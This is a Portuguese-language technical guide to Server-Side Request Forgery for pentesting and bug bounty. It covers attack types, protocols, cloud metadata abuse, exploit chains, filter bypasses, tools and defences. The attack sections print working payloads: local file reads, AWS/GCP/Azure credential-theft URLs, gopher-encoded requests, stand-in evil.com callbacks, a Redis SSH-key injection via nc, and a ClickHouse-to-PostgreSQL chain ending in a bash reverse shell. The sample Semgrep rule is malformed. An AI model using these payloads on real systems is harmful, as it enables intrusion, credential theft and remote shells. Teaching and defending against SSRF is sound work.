<!-- ===================================== -->
<!--        SSRF - Offensive Guide        -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Status-Research%20Document-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Vulnerability-SSRF-critical?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Category-Web%20Security-red?style=flat-square">
  <img src="https://img.shields.io/badge/OWASP-Top%2010%202021-orange?style=flat-square">
  <img src="https://img.shields.io/badge/Impact-Internal%20Access%20%7C%20Cloud%20Compromise-black?style=flat-square">
  <img src="https://img.shields.io/badge/Level-Intermediate%20%E2%86%92%20Advanced-informational?style=flat-square">
</p>

---

# 🌐 SSRF (Server-Side Request Forgery)
## Exploração, Impacto e Defesa em Ambientes Web e Cloud

> Guia técnico completo sobre **Server-Side Request Forgery (SSRF)**, uma das vulnerabilidades mais críticas do cenário moderno de aplicações web.
>
> Este documento aborda desde os fundamentos conceituais até técnicas avançadas de exploração, bypass de filtros, exploração em ambientes cloud e cadeias complexas de ataque.
>
> O foco é apresentar uma visão **ofensiva e defensiva**, contextualizada para Pentest, Bug Bounty, Red Team e análise de segurança em ambientes corporativos.

---

## 🎯 Objetivo do Documento

- Compreender profundamente o funcionamento do SSRF  
- Identificar cenários reais de exploração  
- Explorar serviços internos e ambientes cloud  
- Aplicar técnicas de bypass e encadeamento de vulnerabilidades  
- Entender estratégias modernas de mitigação  

---

## 📌 Metadados Técnicos

- **Categoria:** Web Exploitation · Cloud Security · Internal Network Abuse  
- **Tipos:** Reflected SSRF · Blind SSRF · Out-of-Band SSRF  
- **Protocolos exploráveis:** HTTP · HTTPS · file:// · gopher:// · dict:// · ldap://  
- **Impacto potencial:** Data Exfiltration · Internal Port Scanning · Credential Theft · RCE  
- **Ambientes afetados:** On-Premise · AWS · GCP · Azure  

---

## 🏷️ Tags

`#SSRF` `#OWASPTop10` `#WebSecurity`  
`#CloudSecurity` `#RedTeam` `#Pentest`  
`#BugBounty` `#InternalNetwork` `#RCE`

---

## ⚠️ Aviso Legal

> As técnicas descritas neste documento devem ser utilizadas exclusivamente em:
>
> - Ambientes laboratoriais controlados  
> - Testes de penetração autorizados  
> - Programas de Bug Bounty dentro do escopo permitido  
> - Pesquisas acadêmicas e treinamentos  
>
> A exploração não autorizada de sistemas é ilegal e pode resultar em responsabilização civil e criminal.

---
# SSRF (Server-Side Request Forgery)

## 1. Introdução

### 1.1 O que é SSRF?

**Server-Side Request Forgery (SSRF)** é uma vulnerabilidade que permite que um atacante induza o servidor de uma aplicação a fazer requisições HTTP para destinos arbitrários controlados pelo atacante. Em outras palavras, o atacante consegue "enganar" o servidor para que ele faça requisições em seu nome.

O que torna o SSRF particularmente perigoso é que essas requisições se originam de **dentro do próprio servidor**, que geralmente possui acesso privilegiado a recursos internos que não estão disponíveis para usuários externos. É como se o atacante contratasse um "funcionário de confiança" (o servidor) para buscar informações em áreas restritas que ele não poderia acessar diretamente.

### 1.2 Por que o SSRF é tão crítico?

O SSRF ganhou destaque significativo na comunidade de segurança quando foi incluído no **OWASP Top 10** (2021) como uma das vulnerabilidades mais críticas em aplicações web. Esta inclusão foi motivada por diversos breaches de alto perfil que tiveram o SSRF como vetor inicial, incluindo incidentes onde atacantes conseguiram acessar serviços internos de metadados em nuvem.

**Impactos potenciais do SSRF:**

- **Acesso a sistemas internos:** Firewalls e controles de acesso são bypassados
- **Exfiltração de dados sensíveis:** Arquivos locais, credenciais, tokens
- **Descoberta de rede interna:** Mapeamento de serviços e portas abertas
- **Execução remota de código (RCE):** Em cenários avançados, com chain de vulnerabilidades
- **Ataques de negação de serviço (DoS):** Forçando o servidor a fazer múltiplas requisições

---
## 2. Como o SSRF Funciona

### 2.1 Conceito Fundamental

Uma aplicação web típica pode ter funcionalidades que exigem que o servidor faça requisições a outros servidores. Exemplos comuns incluem:

- Importar avatar de uma URL fornecida pelo usuário    
- Verificar disponibilidade de um serviço externo
- Buscar metadados de um link (preview de links)
- Webhooks que notificam URLs externas
- Integrações com APIs de terceiros

O problema surge quando a aplicação permite que o **usuário controle total ou parcialmente a URL** da requisição sem validação adequada.

### 2.2 Fluxo Básico de um Ataque SSRF

```text
[Atacante] → Requisição maliciosa → [Aplicação Web] → Requisição interna → [Serviço Interno]
                                          ↓
                              Resposta do serviço interno
                                          ↓
[Atacante] ← Resposta da aplicação contendo dados internos
```

![Server-Side Request Forgery](https://my.f5.com/manage/servlet/rtaImage?eid=ka0Po000000ZEzN&feoid=00N1T00000AOnlF&refid=0EMPo00000VxBIX)

### 2.3 Exemplo Simples e Didático

Imagine uma aplicação que permite aos usuários buscar informações de estoque de carros em concessionárias:

**Funcionamento normal:**

```http
POST /model/carstock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

carStockApi=http://carstocks.io:8080/product/stock/check?productId=7
```

O servidor faz uma requisição para `carstocks.io` e retorna o resultado ao usuário.

**Exploração SSRF:**

```http
POST /model/carstock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

carStockApi=http://localhost/admin
```

O que acontece aqui? O atacante não pode acessar diretamente `/admin` no navegador (provavelmente está bloqueado por firewall ou requer autenticação). No entanto, como a requisição parte do **próprio servidor**, que está na rede interna e é "confiável", o acesso é permitido.

---
## 3. Tipos de SSRF

### 3.1 Classificação Principal

O SSRF pode ser classificado em dois tipos principais com base na visibilidade da resposta:

#### SSRF Básico (Non-Blind / Reflected)

Neste tipo, a resposta da requisição forjada é retornada diretamente ao atacante na resposta da aplicação.

**Exemplo em Ruby (Sinatra):**

```ruby
require 'sinatra'
require 'open-uri'

get '/' do
  format 'RESPONSE: %s', open(params[:url]).read
end
```

**Ataque:**

```text
http://localhost:4567/?url=file:///etc/passwd
http://localhost:4567/?url=http://169.254.169.254/latest/meta-data/
```

O conteúdo dos arquivos ou metadados é retornado na resposta.

![Reflected SSRF](https://www.imperva.com/learn/wp-content/uploads/sites/13/2021/12/How-Server-SSRF-works.png)

#### SSRF Cego (Blind)

Neste tipo, a requisição é feita pelo servidor, mas a resposta **não é retornada** ao atacante na resposta HTTP. O atacante precisa inferir o sucesso ou falha através de efeitos colaterais, como:

- Diferenças no tempo de resposta
- Códigos de status HTTP diferentes
- Interações com um servidor externo controlado pelo atacante

### 3.2 Detecção de SSRF Cego com Burp Collaborator

O **Burp Collaborator** é uma ferramenta poderosa para detectar SSRF cego e outras vulnerabilidades out-of-band. Ele funciona como um servidor que espera por conexões iniciadas pelo sistema alvo.

**Como usar:**

1. No Burp Suite Pro, acesse: Burp → Burp Collaborator client
2. Clique em "Copy to clipboard" para gerar um payload como: `abc123def456.burpcollaborator.net`
3. Injete este payload no parâmetro suspeito:

```http
GET /profile?avatar=http://abc123def456.burpcollaborator.net/test HTTP/1.1
```

4. Monitore o Collaborator Client para ver interações

**Tipos de interações detectadas:**

- **DNS:** O servidor tentou resolver o domínio
- **HTTP:** O servidor fez uma requisição HTTP ao colaborador
- **SMTP:** Possível vetor de email

---
## 4. Schemas de URL e Protocolos Exploráveis

Uma das características mais poderosas do SSRF é a capacidade de usar diferentes protocolos URL, não apenas HTTP/HTTPS.

### 4.1 file://

Permite ler arquivos locais do sistema.

**Exemplos:**

```text
file:///etc/passwd
file:///C:/Windows/win.ini
file:///var/www/html/config.php
```

**Resposta esperada:** Conteúdo do arquivo solicitado.

### 4.2 dict://

O protocolo DICT é usado para consultar definições em dicionários, mas pode ser abusado para fazer o servidor conectar a portas arbitrárias e enviar comandos.

**Exemplo:**

```text
dict://evil.com:1337/
```

No servidor do atacante:

```bash
nc -lvp 1337
Connection from [192.168.0.12] port 1337
CLIENT libcurl 7.40.0
```

### 4.3 gopher://

Gopher é um protocolo anterior à web que é extremamente útil em SSRF porque permite enviar **payloads multicamadas** com quebras de linha e bytes nulos.

**Características:**

- Permite enviar requisições completas para outros serviços (HTTP, SMTP, Redis, MySQL)
- Útil para chain com outros serviços internos
- Suportado por muitas bibliotecas HTTP (como cURL)

**Exemplo de payload gopher para enviar uma requisição HTTP POST:**

```text
gopher://127.0.0.1:80/_POST%20/admin.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

**Uso na exploração:**

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//127.0.0.1:80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520127.0.0.1%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin
```

### 4.4 Outros Protocolos Úteis

| Protocolo   | Descrição                             | Exemplo                                 |
| ----------- | ------------------------------------- | --------------------------------------- |
| **sftp://** | SSH File Transfer Protocol            | `sftp://evil.com:1337/`                 |
| **ldap://** | Lightweight Directory Access Protocol | `ldap://localhost:1337/%0astats%0aquit` |
| **tftp://** | Trivial File Transfer Protocol (UDP)  | `tftp://evil.com:1337/TESTUDPPACKET`    |
| **ftp://**  | File Transfer Protocol                | `ftp://ftp.example.com/file.txt`        |

---
## 5. Exploração Prática de SSRF

### 5.1 Cenário: Aplicação de Verificação de Disponibilidade

Baseado em um cenário real de teste de penetração, vamos explorar passo a passo.

#### Passo 1: Identificação da Vulnerabilidade

A aplicação alvo tem um endpoint para verificar disponibilidade de consultas:

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

dateserver=http://dateserver.htb&date=2024-01-01
```

#### Passo 2: Confirmação com Servidor Externo

Configuramos um listener com Netcat:

```bash
nc -lvnp 8000
```

Modificamos a requisição para apontar para nosso servidor:

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

dateserver=http://MEU_IP:8000&date=2024-01-01
```

**Resultado no Netcat:**

```text
connect to [MEU_IP] from (UNKNOWN) [TARGET_IP] 43210
GET / HTTP/1.1
Host: MEU_IP:8000
Accept: */*
```

Confirmação: o servidor fez uma requisição para nosso IP.

#### Passo 3: Verificar se é Refletido ou Cego

Testamos com `http://127.0.0.1/index.php`:

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

dateserver=http://127.0.0.1/index.php&date=2024-01-01
```

Se a resposta contiver o HTML do index.php, é SSRF refletido.

### 5.2 Scanner de Portas Internas via SSRF

Podemos usar o SSRF para escanear portas abertas no localhost ou em outros hosts internos.

**Teste manual:**

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

dateserver=http://127.0.0.1:81&date=2024-01-01
```

- **Porta fechada:** Resposta `500 Internal Server Error` ou mensagem "Failed to connect"
- **Porta aberta:** Resposta `200 OK` (possivelmente com conteúdo)

**Automação com ffuf:**

```bash
# Gerar lista de portas
seq 1 10000 > ports.txt

# Escanear
ffuf -w ./ports.txt -u http://target.com/check_availability -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
  -fr "Failed to connect"
```

O parâmetro `-fr "Failed to connect"` filtra respostas que indicam porta fechada.

### 5.3 Acessando Aplicações Internas

Após identificar portas abertas, podemos acessar as aplicações:

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

dateserver=http://127.0.0.1:8000/admin.php&date=2024-01-01
```

Se a resposta for `200 OK` com conteúdo HTML, expomos um painel administrativo interno.

---
## 6. Exploração em Ambientes Cloud

Um dos usos mais críticos do SSRF é acessar serviços de metadados em provedores cloud.

### 6.1 AWS (Amazon Web Services)

Cada instância EC2 na AWS tem acesso a um endpoint de metadados no IP `169.254.169.254`.

**Endpoints importantes:**

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/NOME_DO_ROLE
```

**Exploração:**

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

dateserver=http://169.254.169.254/latest/meta-data/iam/security-credentials/&date=2024-01-01
```

**Resultado:** Credenciais AWS (AccessKeyId, SecretAccessKey, Token).

### 6.2 Google Cloud Platform

```text
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
```

**Nota:** Requer cabeçalho `Metadata-Flavor: Google`.

### 6.3 Azure

```text
http://169.254.169.254/metadata/instance?api-version=2019-08-15
```

**Nota:** Requer cabeçalho `Metadata: true`.

### 6.4 Impacto Real

Em um caso real documentado, um testador conseguiu:

1. Explorar SSRF para acessar o endpoint de metadados AWS
2. Obter credenciais válidas da instância EC2
3. Usar as credenciais para acessar todos os buckets S3 com permissões de leitura/escrita
4. Elevar a criticidade do achado de **médio para crítico**

---
## 7. Ataques Avançados e Chains

### 7.1 SSRF para RCE via Redis

Se o scan de portas identificar Redis (porta 6379) sem autenticação, podemos usar SSRF para interagir com ele.

**Injeção de chave SSH:**

```bash
(echo -e "\n\n\n\n"; echo -e "set foo \"\n\n\n\n\nssh-rsa AAA... minha-chave\"\n\n\n\n\n") | nc -v 127.0.0.1 6379
```

**Resultado:** Se o Redis estiver configurado para salvar dados em disco e a chave SSH for injetada no diretório correto, podemos obter acesso SSH ao servidor.

### 7.2 Chain Complexo: SSRF + ClickHouse + PostgreSQL → RCE

Um exemplo impressionante de chain de vulnerabilidades foi documentado no PostHog.

**Cenário:**

1. **SSRF** via sistema de webhooks com validação fraca de URLs
2. Servidor faz requisição para um host interno `clickhouse:8123`
3. Payload abusa da função `postgresql()` do ClickHouse para consultar PostgreSQL interno
4. Aproveita um bug de escaping no ClickHouse (0day)
5. Usa `COPY ... FROM PROGRAM` no PostgreSQL para executar comandos no sistema

**Payload final (simplificado):**

```text
http://clickhouse:8123/?query=SELECT * FROM postgresql('db:5432','posthog',"posthog_use')) TO STDOUT; END; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM $$bash -c \"bash -i >& /dev/tcp/172.31.221.180/4444 0>&1\"$$; SELECT * FROM cmd_exec; --",'posthog','posthog')#
```

**Resultado:** Reverse shell no servidor PostgreSQL.

### 7.3 SSRF + XXE

Outra combinação poderosa é usar SSRF para explorar vulnerabilidades XXE (XML External Entities).

**Exemplo:**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localtest.me:6379/"> ]>
```

---
## 8. Bypass de Mecanismos de Proteção

### 8.1 Bypass de Bloqueios de Localhost

Se a aplicação bloquear palavras como "localhost" ou "127.0.0.1", podemos usar alternativas:

**Representações alternativas de 127.0.0.1:**

- `127.0.0.1` (óbvio, mas bloqueado)
- `2130706433` (decimal)
- `0x7f000001` (hexadecimal)
- `127.0.0.0` (algumas implementações aceitam)
- `0` (em alguns sistemas, 0 = 0.0.0.0)
- `127.127.127.127` (loopback em muitas redes)

**Domínios que resolvem para 127.0.0.1:**

- `localhost`
- `localtest.me`
- `localhost.`
- `127.0.0.1.nip.io`

### 8.2 DNS Rebinding

O **DNS rebinding** é uma técnica que contorna validações que verificam o nome do domínio, mas não o IP resolvido.

**Como funciona:**

1. Atacante controla um domínio (ex: `attacker.com`)
2. Configura DNS com TTL muito baixo
3. Inicialmente, `attacker.com` resolve para um IP permitido (ex: `1.2.3.4`)
4. A aplicação valida o domínio e permite a requisição
5. Durante a resolução final, o DNS retorna `127.0.0.1`
6. A requisição vai para o localhost, mas a validação já foi bypassada

**Exemplo real:** A ferramenta Nu Html Checker ([validator.nu](https://validator.nu)) tinha exatamente esta vulnerabilidade.

### 8.3 Open Redirects

Se a aplicação permite apenas domínios confiáveis, podemos usar um redirecionamento aberto em um desses domínios.

**Exemplo:**

```text
http://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

### 8.4 Bypass de Filtros de Porta

Algumas aplicações bloqueiam portas baixas (1-1024) mas permitem portas altas. Muitos serviços críticos rodam em portas altas:

|Serviço|Porta|
|---|---|
|Redis|6379|
|MySQL|3306|
|Elasticsearch|9200|
|MongoDB|27017|
|Node.js apps|3000, 5000, 8000, 8080|
|Angular/React dev|4200|

### 8.5 URL Encoding e Dupla Codificação

Às vezes, filtros simples podem ser bypassados com encoding:

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254%2flatest%2fmeta-data%2f
http://169.254.169.254%252flatest%252fmeta-data%252f (dupla codificação)
```

---
## 9. Ferramentas para Detecção e Exploração

### 9.1 Burp Suite

**Funcionalidades principais:**

- **Repeater:** Testes manuais de payloads
- **Intruder:** Brute force de portas e caminhos
- **Collaborator:** Detecção de SSRF cego
- **Scanner automático:** Detecta SSRF em scans ativos

### 9.2 ffuf

Ferramenta de fuzzing rápida para descoberta de portas e endpoints via SSRF.

```bash
# Scan de portas
ffuf -w ports.txt -u http://target.com/ssrf -X POST \
  -d "url=http://127.0.0.1:FUZZ/" \
  -fr "Failed to connect"
```

### 9.3 Netcat

Útil para receber conexões e confirmar SSRF.

```bash
nc -lvnp 8000
```

### 9.4 Gopherus

Ferramenta especializada para gerar payloads Gopher para diversos serviços.

```bash
# Gerar payload Gopher para MySQL
gopherus --exploit mysql
```

### 9.5 Semgrep

Análise estática de código para encontrar potenciais SSRF.

**Regra exemplo:**

```yaml
rules:
	id: ssrf-detection
    pattern: requests.get($USER_CONTROLLED_URL)
    message: "Potencial SSRF com input do usuário"
```

### 9.6 Ferramentas Especializadas para Novos Contextos

Com o avanço de novas tecnologias, surgem ferramentas específicas. Por exemplo, **mcpsec** é um fuzzer para o Model Context Protocol (MCP) que inclui scanners SSRF para ambientes de AI agents.

---
## 10. Prevenção e Mitigação

### 10.1 Validação de Input

**Nunca permita que o usuário controle o host completo da URL**.

**Abordagem segura:**

```python
# ERRADO - usuário controla tudo
url = request.args.get("url")
requests.get(url)

# MAIS SEGURO - apenas path é controlado
base = "https://api.trusted.com"
path = request.args.get("path")
# Validar path (remover ../, etc.)
requests.get(base + path)
```

### 10.2 Whitelist de Domínios/IPs

Use listas brancas, não listas negras.

```python
ALLOWED_DOMAINS = ["api.trusted.com", "images.cdn.com"]

def is_allowed(url):
    parsed = urlparse(url)
    return parsed.hostname in ALLOWED_DOMAINS
```

### 10.3 Validação de IP Resolvido

Não confie apenas no hostname fornecido; resolva o IP e verifique se não é um IP privado.

```python
import socket

def is_private_ip(hostname):
    try:
        ip = socket.gethostbyname(hostname)
        # Verificar se é loopback, RFC 1918, etc.
        return ip.startswith(("127.", "10.", "192.168.", "172.16.", "169.254."))
    except:
        return True
```

### 10.4 Desabilitar Redirecionamentos Automáticos

Redirecionamentos podem ser usados para bypassar validações.

```python
requests.get(url, allow_redirects=False)
```

### 10.5 Restrição de Protocolos e Portas

Permita apenas protocolos necessários (geralmente apenas HTTP/HTTPS) e bloqueie portas não utilizadas.

### 10.6 Isolamento de Rede

Aplique o princípio do menor privilégio também na rede:

- O servidor web não deve ter acesso irrestrito à rede interna
- Use firewalls para bloquear tráfego desnecessário
- Considere uma DMZ para servidores que precisam fazer requisições externas

### 10.7 Proteção em Ambientes Cloud

**AWS IMDSv2 vs IMDSv1:**  
O IMDSv1 é vulnerável a SSRF; o IMDSv2 adiciona proteções significativas.

**Migração para IMDSv2:**

```bash
# Requerer IMDSv2 para todas as instâncias
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-endpoint enabled
```

O IMDSv2 exige requisições baseadas em sessão, tornando a exploração via SSRF muito mais difícil.

### 10.8 Checklist de Prevenção

- Revisar todas as funcionalidades que fazem requisições baseadas em input do usuário
- Implementar whitelist de domínios/IPs
- Bloquear protocolos desnecessários (file://, gopher://, dict://, etc.)
- Desabilitar redirecionamentos automáticos
- Validar o IP resolvido, não apenas o hostname fornecido
- Aplicar isolamento de rede (princípio do menor privilégio)
- Usar IMDSv2 em ambientes AWS
- Logar e monitorar requisições suspeitas

---
## 11. Conclusão

O Server-Side Request Forgery (SSRF) é uma vulnerabilidade que evoluiu de um problema de "web applications" para um dos riscos mais críticos no cenário atual de segurança, com impacto reconhecido pelo OWASP Top 10.

**Principais aprendizados:**

1. **Conceito fundamental:** SSRF permite que um atacante use o servidor como proxy para acessar recursos internos ou externos não autorizados
2. **Tipos variados:** Pode ser refletido (com retorno de dados) ou cego (sem retorno direto)
3. **Múltiplos protocolos:** Além de HTTP, protocolos como file://, gopher://, dict:// expandem a superfície de ataque
4. **Cloud é alvo preferencial:** Endpoints de metadados em AWS, GCP e Azure são extremamente visados
5. **Chains são poderosas:** SSRF combinado com outras vulnerabilidades (Redis, MySQL, ClickHouse) pode levar a RCE
6. **Bypass é possível:** Mecanismos de proteção fracos podem ser contornados com técnicas como DNS rebinding e representações alternativas de IP
7. **Prevenção em camadas:** Não existe uma única defesa; é necessário combinar validação de input, whitelist, isolamento de rede e hardening de ambiente cloud

